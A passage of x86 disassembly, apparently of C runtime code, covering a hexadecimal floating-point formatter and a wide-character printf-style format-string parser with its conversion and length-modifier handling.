  4070ca:	mov    eax,0x1
  4070cf:	jmp    0x406fb9
  4070d4:	sub    DWORD PTR [ebx+0xc],0x1
  4070d8:	jmp    0x4070a4
  4070da:	lea    esi,[esi+0x0]
  4070e0:	mov    DWORD PTR [ebx+0xc],0x6
  4070e7:	mov    eax,0x6
  4070ec:	jmp    0x406fb9
  4070f1:	sub    eax,esi
  4070f3:	mov    DWORD PTR [ebx+0xc],eax
  4070f6:	jmp    0x40703b
  4070fb:	nop
  4070fc:	lea    esi,[esi+eiz*1+0x0]
  407100:	mov    edx,eax
  407102:	mov    eax,DWORD PTR [esp+0x28]
  407106:	mov    ecx,ebx
  407108:	call   0x406220
  40710d:	jmp    0x4070b4
  40710f:	nop
  407110:	mov    edx,DWORD PTR [ebx+0x8]
  407113:	test   edx,edx
  407115:	jle    0x40703b
  40711b:	add    eax,edx
  40711d:	mov    DWORD PTR [ebx+0x8],eax
  407120:	jmp    0x40703b
  407125:	lea    esi,[esi+eiz*1+0x0]
  407129:	lea    edi,[edi+eiz*1+0x0]
  407130:	push   ebp
  407131:	push   edi
  407132:	push   esi
  407133:	push   ebx
  407134:	mov    ebx,eax
  407136:	sub    esp,0x5c
  407139:	fld    TBYTE PTR [esp+0x70]
  40713d:	fld    st(0)
  40713f:	fstp   TBYTE PTR [esp+0x28]
  407143:	fxam   
  407145:	fstsw  ax
  407148:	and    ax,0x4500
  40714c:	cmp    ax,0x100
  407150:	je     0x407634
  407156:	movzx  edi,WORD PTR [esp+0x30]
  40715b:	mov    esi,edi
  40715d:	and    esi,0x8000
  407163:	jne    0x4072a0
  407169:	fxam   
  40716b:	fstsw  ax
  40716e:	fstp   st(0)
  407170:	and    ax,0x4500
  407174:	cmp    ax,0x500
  407178:	je     0x407649
  40717e:	and    di,0x7fff
  407183:	mov    ecx,edi
  407185:	je     0x4072b0
  40718b:	mov    ebp,DWORD PTR [ebx+0xc]
  40718e:	lea    eax,[ecx-0x3fff]
  407194:	mov    esi,DWORD PTR [esp+0x28]
  407198:	mov    edi,DWORD PTR [esp+0x2c]
  40719c:	mov    WORD PTR [esp+0x16],ax
  4071a1:	cmp    ebp,0xe
  4071a4:	jbe    0x407401
  4071aa:	mov    eax,edi
  4071ac:	or     eax,esi
  4071ae:	je     0x4075cb
  4071b4:	mov    eax,DWORD PTR [ebx+0x4]
  4071b7:	lea    ecx,[esp+0x38]
  4071bb:	movzx  edx,WORD PTR [esp+0x16]
  4071c0:	mov    DWORD PTR [esp+0x8],ebx
  4071c4:	mov    ebp,ecx
  4071c6:	mov    DWORD PTR [esp+0xc],ecx
  4071ca:	mov    ecx,eax
  4071cc:	mov    DWORD PTR [esp+0x18],eax
  4071d0:	and    eax,0x20
  4071d3:	and    ecx,0x800
  4071d9:	mov    BYTE PTR [esp+0x10],al
  4071dd:	mov    DWORD PTR [esp+0x1c],ecx
  4071e1:	mov    ecx,ebp
  4071e3:	jmp    0x407227
  4071e5:	mov    ebx,DWORD PTR [esp+0x8]
  4071e9:	mov    ebx,DWORD PTR [ebx+0xc]
  4071ec:	test   ebx,ebx
  4071ee:	jle    0x4071fa
  4071f0:	mov    ebp,DWORD PTR [esp+0x8]
  4071f4:	sub    ebx,0x1
  4071f7:	mov    DWORD PTR [ebp+0xc],ebx
  4071fa:	shrd   esi,edi,0x4
  4071fe:	shr    edi,0x4
  407201:	test   eax,eax
  407203:	mov    ebp,ecx
  407205:	je     0x40727f
  407207:	cmp    eax,0x9
  40720a:	lea    ecx,[ebp+0x1]
  40720d:	jle    0x407297
  407213:	add    eax,0x37
  407216:	or     al,BYTE PTR [esp+0x10]
  40721a:	mov    BYTE PTR [ebp+0x0],al
  40721d:	mov    eax,edi
  40721f:	or     eax,esi
  407221:	je     0x407300
  407227:	mov    eax,esi
  407229:	and    eax,0xf
  40722c:	cmp    eax,esi
  40722e:	jne    0x4071e5
  407230:	cmp    ecx,DWORD PTR [esp+0xc]
  407234:	ja     0x407250
  407236:	mov    ebp,DWORD PTR [esp+0x1c]
  40723a:	test   ebp,ebp
  40723c:	jne    0x407250
  40723e:	mov    ebx,DWORD PTR [esp+0x8]
  407242:	mov    ebp,ecx
  407244:	mov    ebx,DWORD PTR [ebx+0xc]
  407247:	test   ebx,ebx
  407249:	jle    0x407256
  40724b:	nop
  40724c:	lea    esi,[esi+eiz*1+0x0]
  407250:	lea    ebp,[ecx+0x1]
  407253:	mov    BYTE PTR [ecx],0x2e
  407256:	cmp    edi,0x0
  407259:	ja     0x407260
  40725b:	cmp    esi,0x1
  40725e:	jbe    0x407277
  407260:	lea    ecx,[edx-0x1]
  407263:	shrd   esi,edi,0x1
  407267:	shr    edi,1
  407269:	mov    edx,ecx
  40726b:	mov    ebx,esi
  40726d:	lea    ecx,[edx-0x1]
  407270:	xor    ebx,0x1
  407273:	or     ebx,edi
  407275:	jne    0x407263
  407277:	xor    esi,esi
  407279:	xor    edi,edi
  40727b:	test   eax,eax
  40727d:	jne    0x407207
  40727f:	cmp    ebp,DWORD PTR [esp+0xc]
  407283:	ja     0x407294
  407285:	mov    ecx,DWORD PTR [esp+0x8]
  407289:	mov    ecx,DWORD PTR [ecx+0xc]
  40728c:	test   ecx,ecx
  40728e:	js     0x407480
  407294:	lea    ecx,[ebp+0x1]
  407297:	add    eax,0x30
  40729a:	jmp    0x40721a
  40729f:	nop
  4072a0:	or     DWORD PTR [ebx+0x4],0x80
  4072a7:	jmp    0x407169
  4072ac:	lea    esi,[esi+eiz*1+0x0]
  4072b0:	mov    edx,DWORD PTR [esp+0x2c]
  4072b4:	mov    eax,DWORD PTR [esp+0x28]
  4072b8:	mov    edi,edx
  4072ba:	or     edi,eax
  4072bc:	je     0x4075bc
  4072c2:	test   edx,edx
  4072c4:	js     0x40766e
  4072ca:	mov    ecx,0xffffc001
  4072cf:	nop
  4072d0:	shld   edx,eax,0x1
  4072d4:	mov    edi,ecx
  4072d6:	add    eax,eax
  4072d8:	sub    ecx,0x1
  4072db:	test   edx,edx
  4072dd:	jns    0x4072d0
  4072df:	mov    WORD PTR [esp+0x16],di
  4072e4:	mov    esi,eax
  4072e6:	mov    edi,edx
  4072e8:	mov    ebp,DWORD PTR [ebx+0xc]
  4072eb:	cmp    ebp,0xe
  4072ee:	jbe    0x40741f
  4072f4:	jmp    0x4071b4
  4072f9:	lea    esi,[esi+eiz*1+0x0]
  407300:	cmp    ecx,DWORD PTR [esp+0xc]
  407304:	mov    WORD PTR [esp+0x16],dx
  407309:	mov    ebp,ecx
  40730b:	mov    ebx,DWORD PTR [esp+0x8]
  40730f:	je     0x407666
  407315:	mov    eax,DWORD PTR [ebx+0x8]
  407318:	test   eax,eax
  40731a:	mov    DWORD PTR [esp+0x8],eax
  40731e:	jle    0x4075a9
  407324:	mov    eax,ebp
  407326:	sub    eax,DWORD PTR [esp+0xc]
  40732a:	mov    edx,DWORD PTR [ebx+0xc]
  40732d:	movsx  edi,WORD PTR [esp+0x16]
  407332:	test   edx,edx
  407334:	lea    ecx,[eax+edx*1]
  407337:	mov    edx,DWORD PTR [esp+0x18]
  40733b:	mov    DWORD PTR [esp+0x10],edi
  40733f:	cmovg  eax,ecx
  407342:	mov    ecx,0x66666667
  407347:	and    edx,0x1c0
  40734d:	cmp    edx,0x1
  407350:	sbb    edx,edx
  407352:	lea    esi,[eax+edx*1+0x6]
  407356:	mov    eax,edi
  407358:	imul   ecx
  40735a:	mov    eax,edi
  40735c:	sar    eax,0x1f
  40735f:	mov    ecx,edx
  407361:	sar    ecx,0x2
  407364:	sub    ecx,eax
  407366:	je     0x40765c
  40736c:	mov    edi,0x2
  407371:	mov    eax,0x66666667
  407376:	add    esi,0x1
  407379:	add    edi,0x1
  40737c:	imul   ecx
  40737e:	sar    ecx,0x1f
  407381:	sar    edx,0x2
  407384:	sub    edx,ecx
  407386:	mov    ecx,edx
  407388:	jne    0x407371
  40738a:	movsx  edi,di
  40738d:	cmp    DWORD PTR [esp+0x8],esi
  407391:	jle    0x407490
  407397:	mov    eax,DWORD PTR [esp+0x8]
  40739b:	sub    eax,esi
  40739d:	test   DWORD PTR [esp+0x18],0x600
  4073a5:	jne    0x4075f6
  4073ab:	lea    edx,[eax-0x1]
  4073ae:	test   eax,eax
  4073b0:	mov    DWORD PTR [ebx+0x8],edx
  4073b3:	jle    0x407497
  4073b9:	lea    esi,[esi+eiz*1+0x0]
  4073c0:	mov    edx,ebx
  4073c2:	mov    eax,0x20
  4073c7:	call   0x405f50
  4073cc:	mov    eax,DWORD PTR [ebx+0x8]
  4073cf:	lea    edx,[eax-0x1]
  4073d2:	test   eax,eax
  4073d4:	mov    DWORD PTR [ebx+0x8],edx
  4073d7:	jg     0x4073c0
  4073d9:	mov    eax,DWORD PTR [ebx+0x4]
  4073dc:	mov    DWORD PTR [esp+0x18],eax
  4073e0:	test   BYTE PTR [esp+0x18],0x80
  4073e5:	je     0x4074a2
  4073eb:	nop
  4073ec:	lea    esi,[esi+eiz*1+0x0]
  4073f0:	mov    edx,ebx
  4073f2:	mov    eax,0x2d
  4073f7:	call   0x405f50
  4073fc:	jmp    0x4074bb
  407401:	test   edi,edi
  407403:	js     0x40741f
  407405:	mov    ecx,eax
  407407:	mov    esi,esi
  407409:	lea    edi,[edi+eiz*1+0x0]
  407410:	shld   edi,esi,0x1
  407414:	add    esi,esi
  407416:	test   edi,edi
  407418:	jns    0x407410
  40741a:	mov    WORD PTR [esp+0x16],cx
  40741f:	mov    ecx,0xe
  407424:	mov    eax,0x4
  407429:	xor    edx,edx
  40742b:	sub    ecx,ebp
  40742d:	shl    ecx,0x2
  407430:	shrd   esi,edi,0x1
  407434:	shld   edx,eax,cl
  407437:	shr    edi,1
  407439:	shl    eax,cl
  40743b:	test   cl,0x20
  40743e:	je     0x407444
  407440:	mov    edx,eax
  407442:	xor    eax,eax
  407444:	add    eax,esi
  407446:	adc    edx,edi
  407448:	test   edx,edx
  40744a:	js     0x407629
  407450:	shld   edx,eax,0x1
  407454:	add    eax,eax
  407456:	mov    ecx,0xf
  40745b:	xor    esi,esi
  40745d:	sub    ecx,ebp
  40745f:	shl    ecx,0x2
  407462:	shrd   eax,edx,cl
  407465:	shr    edx,cl
  407467:	test   cl,0x20
  40746a:	cmovne eax,edx
  40746d:	cmovne edx,esi
  407470:	mov    edi,edx
  407472:	mov    esi,eax
  407474:	jmp    0x4071b4
  407479:	lea    esi,[esi+eiz*1+0x0]
  407480:	mov    ecx,ebp
  407482:	jmp    0x40721d
  407487:	mov    esi,esi
  407489:	lea    edi,[edi+eiz*1+0x0]
  407490:	mov    DWORD PTR [ebx+0x8],0xffffffff
  407497:	test   BYTE PTR [esp+0x18],0x80
  40749c:	jne    0x4073f0
  4074a2:	test   DWORD PTR [esp+0x18],0x100
  4074aa:	jne    0x407607
  4074b0:	test   BYTE PTR [esp+0x18],0x40
  4074b5:	jne    0x407618
  4074bb:	mov    edx,ebx
  4074bd:	mov    eax,0x30
  4074c2:	call   0x405f50
  4074c7:	mov    eax,DWORD PTR [ebx+0x4]
  4074ca:	mov    edx,ebx
  4074cc:	and    eax,0x20
  4074cf:	or     eax,0x58
  4074d2:	call   0x405f50
  4074d7:	mov    eax,DWORD PTR [ebx+0x8]
  4074da:	test   eax,eax
  4074dc:	jle    0x407509
  4074de:	test   BYTE PTR [ebx+0x5],0x2
  4074e2:	je     0x407509
  4074e4:	sub    eax,0x1
  4074e7:	mov    DWORD PTR [ebx+0x8],eax
  4074ea:	lea    esi,[esi+0x0]
  4074f0:	mov    edx,ebx
  4074f2:	mov    eax,0x30
  4074f7:	call   0x405f50
  4074fc:	mov    eax,DWORD PTR [ebx+0x8]
  4074ff:	lea    edx,[eax-0x1]
  407502:	test   eax,eax
  407504:	mov    DWORD PTR [ebx+0x8],edx
  407507:	jg     0x4074f0
  407509:	cmp    ebp,DWORD PTR [esp+0xc]
  40750d:	mov    esi,DWORD PTR [esp+0xc]
  407511:	ja     0x407537
  407513:	jmp    0x40755d
  407515:	movzx  eax,WORD PTR [ebx+0x1c]
  407519:	test   ax,ax
  40751c:	mov    WORD PTR [esp+0x26],ax
  407521:	je     0x407533
  407523:	lea    eax,[esp+0x26]
  407527:	mov    ecx,ebx
  407529:	mov    edx,0x1
  40752e:	call   0x405fb0
  407533:	cmp    ebp,esi
  407535:	je     0x40755d
  407537:	sub    ebp,0x1
  40753a:	movsx  eax,BYTE PTR [ebp+0x0]
  40753e:	cmp    eax,0x2e
  407541:	je     0x4075a0
  407543:	cmp    eax,0x2c
  407546:	je     0x407515
  407548:	mov    edx,ebx
  40754a:	call   0x405f50
  40754f:	jmp    0x407533
  407551:	mov    edx,ebx
  407553:	mov    eax,0x30
  407558:	call   0x405f50
  40755d:	mov    eax,DWORD PTR [ebx+0xc]
  407560:	lea    edx,[eax-0x1]
  407563:	test   eax,eax
  407565:	mov    DWORD PTR [ebx+0xc],edx
  407568:	jg     0x407551
  40756a:	mov    eax,DWORD PTR [ebx+0x4]
  40756d:	mov    edx,ebx
  40756f:	and    eax,0x20
  407572:	or     eax,0x50
  407575:	call   0x405f50
  40757a:	mov    eax,DWORD PTR [esp+0x10]
  40757e:	add    DWORD PTR [ebx+0x8],edi
  407581:	mov    ecx,ebx
  407583:	or     DWORD PTR [ebx+0x4],0x1c0
  40758a:	cdq    
  40758b:	call   0x4062c0
  407590:	add    esp,0x5c
  407593:	pop    ebx
  407594:	pop    esi
  407595:	pop    edi
  407596:	pop    ebp
  407597:	ret    
  407598:	nop
  407599:	lea    esi,[esi+eiz*1+0x0]
  4075a0:	mov    eax,ebx
  4075a2:	call   0x406970
  4075a7:	jmp    0x407533
  4075a9:	movsx  eax,WORD PTR [esp+0x16]
  4075ae:	mov    edi,0x2
  4075b3:	mov    DWORD PTR [esp+0x10],eax
  4075b7:	jmp    0x407497
  4075bc:	mov    ebp,DWORD PTR [ebx+0xc]
  4075bf:	cmp    ebp,0xe
  4075c2:	jbe    0x4075fe
  4075c4:	xor    edx,edx
  4075c6:	mov    WORD PTR [esp+0x16],dx
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	mov    DWORD PTR [esp+0x18],eax
  4075d2:	lea    eax,[esp+0x38]
  4075d6:	mov    DWORD PTR [esp+0xc],eax
  4075da:	test   ebp,ebp
  4075dc:	jle    0x407681
  4075e2:	lea    eax,[esp+0x39]
  4075e6:	mov    BYTE PTR [esp+0x38],0x2e
  4075eb:	lea    ebp,[eax+0x1]
  4075ee:	mov    BYTE PTR [eax],0x30
  4075f1:	jmp    0x407315
  4075f6:	mov    DWORD PTR [ebx+0x8],eax
  4075f9:	jmp    0x407497
  4075fe:	xor    esi,esi
  407600:	xor    edi,edi
  407602:	jmp    0x407410
  407607:	mov    edx,ebx
  407609:	mov    eax,0x2b
  40760e:	call   0x405f50
  407613:	jmp    0x4074bb
  407618:	mov    edx,ebx
  40761a:	mov    eax,0x20
  40761f:	call   0x405f50
  407624:	jmp    0x4074bb
  407629:	add    WORD PTR [esp+0x16],0x1
  40762f:	jmp    0x407456
  407634:	fstp   st(0)
  407636:	mov    ecx,ebx
  407638:	mov    edx,0x40de48
  40763d:	xor    eax,eax
  40763f:	call   0x406220
  407644:	jmp    0x407590
  407649:	mov    ecx,ebx
  40764b:	mov    edx,0x40de4c
  407650:	mov    eax,esi
  407652:	call   0x406220
  407657:	jmp    0x407590
  40765c:	mov    edi,0x2
  407661:	jmp    0x40738d
  407666:	mov    ebp,DWORD PTR [ebx+0xc]
  407669:	jmp    0x4075da
  40766e:	mov    esi,eax
  407670:	mov    eax,0xffffc002
  407675:	mov    edi,edx
  407677:	mov    WORD PTR [esp+0x16],ax
  40767c:	jmp    0x4072e8
  407681:	test   DWORD PTR [esp+0x18],0x800
  407689:	mov    eax,DWORD PTR [esp+0xc]
  40768d:	je     0x4075eb
  407693:	jmp    0x4075e2
  407698:	nop
  407699:	lea    esi,[esi+eiz*1+0x0]
  4076a0:	push   ebp
  4076a1:	push   edi
  4076a2:	push   esi
  4076a3:	push   ebx
  4076a4:	xor    esi,esi
  4076a6:	xor    ebx,ebx
  4076a8:	sub    esp,0x6c
  4076ab:	mov    ebp,DWORD PTR [esp+0x8c]
  4076b2:	call   0x40ad60
  4076b7:	mov    eax,DWORD PTR [eax]
  4076b9:	mov    DWORD PTR [esp],0x40de65
  4076c0:	mov    DWORD PTR [esp+0x3c],0xffffffff
  4076c8:	mov    DWORD PTR [esp+0x40],0xffffffff
  4076d0:	mov    DWORD PTR [esp+0x44],0xfffffffd
  4076d8:	mov    WORD PTR [esp+0x48],bx
  4076dd:	mov    DWORD PTR [esp+0x1c],eax
  4076e1:	mov    eax,DWORD PTR [esp+0x84]
  4076e8:	mov    DWORD PTR [esp+0x4c],0x0
  4076f0:	mov    WORD PTR [esp+0x50],si
  4076f5:	mov    DWORD PTR [esp+0x54],0x0
  4076fd:	mov    DWORD PTR [esp+0x34],eax
  407701:	mov    eax,DWORD PTR [esp+0x80]
  407708:	and    eax,0x6000
  40770d:	mov    DWORD PTR [esp+0x18],eax
  407711:	mov    DWORD PTR [esp+0x38],eax
  407715:	mov    eax,DWORD PTR [esp+0x88]
  40771c:	mov    DWORD PTR [esp+0x58],eax
  407720:	call   0x40ad00
  407725:	test   eax,eax
  407727:	je     0x407739
  407729:	movsx  edx,BYTE PTR [eax]
  40772c:	mov    eax,0x2
  407731:	sub    edx,0x30
  407734:	cmp    edx,0x2
  407737:	jbe    0x407746
  407739:	call   0x40ae80
  40773e:	and    eax,0x1
  407741:	neg    eax
  407743:	add    eax,0x3
  407746:	movzx  edx,WORD PTR [ebp+0x0]
  40774a:	mov    DWORD PTR [esp+0x5c],eax
  40774e:	xchg   ax,ax
  407750:	movzx  eax,dx
  407753:	lea    esi,[ebp+0x2]
  407756:	test   eax,eax
  407758:	je     0x4077f0
  40775e:	cmp    eax,0x25
  407761:	jne    0x407800
  407767:	mov    eax,DWORD PTR [esp+0x18]
  40776b:	movzx  edx,WORD PTR [ebp+0x2]
  40776f:	xor    edi,edi
  407771:	mov    DWORD PTR [esp+0x40],0xffffffff
  407779:	mov    DWORD PTR [esp+0x3c],0xffffffff
  407781:	mov    ebx,esi
  407783:	mov    DWORD PTR [esp+0x10],0x0
  40778b:	mov    DWORD PTR [esp+0x38],eax
  40778f:	lea    eax,[esp+0x3c]
  407793:	test   dx,dx
  407796:	mov    DWORD PTR [esp+0x14],eax
  40779a:	je     0x4077d8
  40779c:	lea    ecx,[edx-0x20]
  40779f:	lea    ebp,[ebx+0x2]
  4077a2:	movzx  eax,dx
  4077a5:	cmp    cx,0x5a
  4077a9:	ja     0x407e20
  4077af:	movzx  ecx,cx
  4077b2:	jmp    DWORD PTR [ecx*4+0x40de7c]
  4077b9:	lea    esi,[esi+eiz*1+0x0]
  4077c0:	movzx  edx,WORD PTR [ebx+0x2]
  4077c4:	mov    DWORD PTR [esp+0x10],0x2
  4077cc:	mov    edi,0x4
  4077d1:	mov    ebx,ebp
  4077d3:	test   dx,dx
  4077d6:	jne    0x40779c
  4077d8:	movzx  eax,dx
  4077db:	mov    ebp,ebx
  4077dd:	test   eax,eax
  4077df:	lea    esi,[ebp+0x2]
  4077e2:	jne    0x40775e
  4077e8:	nop
  4077e9:	lea    esi,[esi+eiz*1+0x0]
  4077f0:	mov    eax,DWORD PTR [esp+0x54]
  4077f4:	add    esp,0x6c
  4077f7:	pop    ebx
  4077f8:	pop    esi
  4077f9:	pop    edi
  4077fa:	pop    ebp
  4077fb:	ret    
  4077fc:	lea    esi,[esi+eiz*1+0x0]
  407800:	lea    edx,[esp+0x34]
  407804:	call   0x405f50
  407809:	movzx  edx,WORD PTR [ebp+0x2]
  40780d:	mov    ebp,esi
  40780f:	jmp    0x407750
  407814:	mov    edx,DWORD PTR [esp+0x10]
  407818:	mov    eax,DWORD PTR [esp+0x90]
  40781f:	sub    edx,0x2
  407822:	cmp    edx,0x1
  407825:	jbe    0x407e70
  40782b:	mov    ebx,DWORD PTR [eax]
  40782d:	add    DWORD PTR [esp+0x90],0x4
  407835:	test   ebx,ebx
  407837:	je     0x407917
  40783d:	mov    DWORD PTR [esp],ebx
  407840:	call   0x40acd0
  407845:	mov    edx,eax
  407847:	lea    ecx,[esp+0x34]
  40784b:	mov    eax,ebx
  40784d:	call   0x406100
  407852:	movzx  edx,WORD PTR [ebp+0x0]
  407856:	jmp    0x407750
  40785b:	nop
  40785c:	lea    esi,[esi+eiz*1+0x0]
  407860:	test   edi,edi
  407862:	jne    0x407872
  407864:	mov    eax,DWORD PTR [esp+0x18]
  407868:	cmp    DWORD PTR [esp+0x38],eax
  40786c:	je     0x40807e
  407872:	mov    eax,DWORD PTR [esp+0x90]
  407879:	xor    ecx,ecx
  40787b:	mov    DWORD PTR [esp+0x2c],0x0
  407883:	lea    ebx,[eax+0x4]
  407886:	mov    eax,DWORD PTR [eax]
  407888:	mov    DWORD PTR [esp+0x28],eax
  40788c:	mov    eax,DWORD PTR [esp+0x90]
  407893:	mov    edx,DWORD PTR [eax]
  407895:	lea    eax,[esp+0x34]
  407899:	mov    DWORD PTR [esp],eax
  40789c:	mov    eax,0x78
  4078a1:	call   0x4065c0
  4078a6:	mov    DWORD PTR [esp+0x90],ebx
  4078ad:	jmp    0x407852
  4078af:	nop
  4078b0:	cmp    DWORD PTR [esp+0x10],0x4
  4078b5:	mov    eax,DWORD PTR [esp+0x90]
  4078bc:	mov    edx,DWORD PTR [esp+0x54]
  4078c0:	mov    eax,DWORD PTR [eax]
  4078c2:	je     0x407fd6
  4078c8:	cmp    DWORD PTR [esp+0x10],0x1
  4078cd:	je     0x408041
  4078d3:	cmp    DWORD PTR [esp+0x10],0x2
  4078d8:	je     0x4080de
  4078de:	cmp    DWORD PTR [esp+0x10],0x3
  4078e3:	mov    DWORD PTR [eax],edx
  4078e5:	je     0x408153
  4078eb:	mov    eax,DWORD PTR [esp+0x90]
  4078f2:	add    eax,0x4
  4078f5:	mov    DWORD PTR [esp+0x90],eax
  4078fc:	jmp    0x407852
  407901:	mov    eax,DWORD PTR [esp+0x1c]
  407905:	mov    DWORD PTR [esp],eax
  407908:	call   0x40acd8
  40790d:	test   eax,eax
  40790f:	mov    ebx,eax
  407911:	jne    0x40783d
  407917:	mov    edx,0x6
  40791c:	mov    ebx,0x40de5e
  407921:	jmp    0x407847
  407926:	lea    esi,[esi+0x0]
  407929:	lea    edi,[edi+eiz*1+0x0]
  407930:	movzx  edx,WORD PTR [ebx+0x2]
  407934:	cmp    dx,0x6c
  407938:	je     0x407f58
  40793e:	mov    DWORD PTR [esp+0x10],0x2
  407946:	mov    edi,0x4
  40794b:	mov    ebx,ebp
  40794d:	jmp    0x4077d3
  407952:	movzx  edx,WORD PTR [ebx+0x2]
  407956:	mov    DWORD PTR [esp+0x10],0x3
  40795e:	mov    edi,0x4
  407963:	mov    ebx,ebp
  407965:	jmp    0x4077d3
  40796a:	lea    esi,[esi+0x0]
  407970:	mov    eax,DWORD PTR [esp+0x38]
  407974:	mov    edx,DWORD PTR [esp+0x90]
  40797b:	or     eax,0x20
  40797e:	test   al,0x4
  407980:	mov    DWORD PTR [esp+0x38],eax
  407984:	je     0x407c04
  40798a:	fld    TBYTE PTR [edx]
  40798c:	lea    eax,[esp+0x34]
  407990:	add    DWORD PTR [esp+0x90],0xc
  407998:	fstp   TBYTE PTR [esp]
  40799b:	call   0x406fa0
  4079a0:	jmp    0x407852
  4079a5:	mov    eax,DWORD PTR [esp+0x38]
  4079a9:	mov    edx,DWORD PTR [esp+0x90]
  4079b0:	or     eax,0x20
  4079b3:	test   al,0x4
  4079b5:	mov    DWORD PTR [esp+0x38],eax
  4079b9:	je     0x407c33
  4079bf:	fld    TBYTE PTR [edx]
  4079c1:	lea    eax,[esp+0x34]
  4079c5:	add    DWORD PTR [esp+0x90],0xc
  4079cd:	fstp   TBYTE PTR [esp]
  4079d0:	call   0x406ec0
  4079d5:	jmp    0x407852
  4079da:	lea    esi,[esi+0x0]
  4079e0:	movzx  edx,WORD PTR [ebx+0x2]
  4079e4:	cmp    dx,0x68
  4079e8:	je     0x407f3d
  4079ee:	mov    DWORD PTR [esp+0x10],0x1
  4079f6:	mov    edi,0x4
  4079fb:	mov    ebx,ebp
  4079fd:	jmp    0x4077d3
  407a02:	mov    eax,DWORD PTR [esp+0x38]
  407a06:	mov    edx,DWORD PTR [esp+0x90]
  407a0d:	or     eax,0x20
  407a10:	test   al,0x4
  407a12:	mov    DWORD PTR [esp+0x38],eax
  407a16:	je     0x407c63
  407a1c:	fld    TBYTE PTR [edx]
  407a1e:	lea    eax,[esp+0x34]
  407a22:	add    DWORD PTR [esp+0x90],0xc
  407a2a:	fstp   TBYTE PTR [esp]
  407a2d:	call   0x406e10
  407a32:	jmp    0x407852
  407a37:	mov    esi,esi
  407a39:	lea    edi,[edi+eiz*1+0x0]
  407a40:	or     DWORD PTR [esp+0x38],0x80
  407a48:	cmp    DWORD PTR [esp+0x10],0x3
  407a4d:	mov    eax,DWORD PTR [esp+0x90]
  407a54:	je     0x407f73
  407a5a:	cmp    DWORD PTR [esp+0x10],0x2
  407a5f:	je     0x40801e
  407a65:	lea    edx,[eax+0x4]
  407a68:	mov    eax,DWORD PTR [eax]
  407a6a:	mov    DWORD PTR [esp+0x28],eax
  407a6e:	sar    eax,0x1f
  407a71:	cmp    DWORD PTR [esp+0x10],0x1
  407a76:	mov    DWORD PTR [esp+0x2c],eax
  407a7a:	je     0x4080c2
  407a80:	cmp    DWORD PTR [esp+0x10],0x4
  407a85:	mov    DWORD PTR [esp+0x90],edx
  407a8c:	je     0x40813e
  407a92:	mov    eax,DWORD PTR [esp+0x28]
  407a96:	mov    edx,DWORD PTR [esp+0x2c]
  407a9a:	lea    ecx,[esp+0x34]
  407a9e:	call   0x4062c0
  407aa3:	jmp    0x407852
  407aa8:	nop
  407aa9:	lea    esi,[esi+eiz*1+0x0]
  407ab0:	mov    edx,DWORD PTR [esp+0x10]
  407ab4:	mov    eax,DWORD PTR [esp+0x90]
  407abb:	mov    DWORD PTR [esp+0x40],0xffffffff
  407ac3:	sub    edx,0x2
  407ac6:	cmp    edx,0x1
  407ac9:	jbe    0x407c88
  407acf:	mov    eax,DWORD PTR [eax]
  407ad1:	lea    ecx,[esp+0x34]
  407ad5:	mov    edx,0x1
  407ada:	add    DWORD PTR [esp+0x90],0x4
  407ae2:	mov    BYTE PTR [esp+0x28],al
  407ae6:	lea    eax,[esp+0x28]
  407aea:	call   0x406100
  407aef:	jmp    0x407852
  407af4:	mov    eax,DWORD PTR [esp+0x38]
  407af8:	mov    edx,DWORD PTR [esp+0x90]
  407aff:	or     eax,0x20
  407b02:	test   al,0x4
  407b04:	mov    DWORD PTR [esp+0x38],eax
  407b08:	je     0x407cd3
  407b0e:	fld    TBYTE PTR [edx]
  407b10:	lea    eax,[esp+0x34]
  407b14:	add    DWORD PTR [esp+0x90],0xc
  407b1c:	fstp   TBYTE PTR [esp]
  407b1f:	call   0x407130
  407b24:	jmp    0x407852
  407b29:	lea    esi,[esi+eiz*1+0x0]
  407b30:	cmp    DWORD PTR [esp+0x10],0x3
  407b35:	mov    edi,DWORD PTR [esp+0x90]
  407b3c:	je     0x407fba
  407b42:	cmp    DWORD PTR [esp+0x10],0x2
  407b47:	je     0x40805a
  407b4d:	cmp    DWORD PTR [esp+0x10],0x1
  407b52:	lea    edx,[edi+0x4]
  407b55:	mov    edi,DWORD PTR [edi]
  407b57:	mov    DWORD PTR [esp+0x2c],0x0
  407b5f:	mov    DWORD PTR [esp+0x28],edi
  407b63:	je     0x4080f6
  407b69:	cmp    DWORD PTR [esp+0x10],0x4
  407b6e:	mov    DWORD PTR [esp+0x90],edx
  407b75:	je     0x408128
  407b7b:	cmp    eax,0x75
  407b7e:	je     0x407a92
  407b84:	lea    edi,[esp+0x34]
  407b88:	mov    edx,DWORD PTR [esp+0x28]
  407b8c:	mov    ecx,DWORD PTR [esp+0x2c]
  407b90:	mov    DWORD PTR [esp],edi
  407b93:	call   0x4065c0
  407b98:	jmp    0x407852
  407b9d:	lea    esi,[esi+0x0]
  407ba0:	movzx  edx,WORD PTR [ebx+0x2]
  407ba4:	or     DWORD PTR [esp+0x38],0x4
  407ba9:	mov    edi,0x4
  407bae:	mov    ebx,ebp
  407bb0:	jmp    0x4077d3
  407bb5:	movzx  edx,WORD PTR [ebx+0x2]
  407bb9:	cmp    dx,0x36
  407bbd:	je     0x407f96
  407bc3:	cmp    dx,0x33
  407bc7:	jne    0x40793e
  407bcd:	cmp    WORD PTR [ebx+0x4],0x32
  407bd2:	je     0x408092
  407bd8:	mov    edx,0x33
  407bdd:	mov    DWORD PTR [esp+0x10],0x2
  407be5:	mov    edi,0x4
  407bea:	mov    ebx,ebp
  407bec:	jmp    0x4077d3
  407bf1:	mov    eax,DWORD PTR [esp+0x38]
  407bf5:	mov    edx,DWORD PTR [esp+0x90]
  407bfc:	test   al,0x4
  407bfe:	jne    0x40798a
  407c04:	fld    QWORD PTR [edx]
  407c06:	lea    eax,[esp+0x34]
  407c0a:	add    DWORD PTR [esp+0x90],0x8
  407c12:	fstp   TBYTE PTR [esp]
  407c15:	call   0x406fa0
  407c1a:	jmp    0x407852
  407c1f:	nop
  407c20:	mov    eax,DWORD PTR [esp+0x38]
  407c24:	mov    edx,DWORD PTR [esp+0x90]
  407c2b:	test   al,0x4
  407c2d:	jne    0x4079bf
  407c33:	fld    QWORD PTR [edx]
  407c35:	lea    eax,[esp+0x34]
  407c39:	add    DWORD PTR [esp+0x90],0x8
  407c41:	fstp   TBYTE PTR [esp]
  407c44:	call   0x406ec0
  407c49:	jmp    0x407852
  407c4e:	xchg   ax,ax
  407c50:	mov    eax,DWORD PTR [esp+0x38]
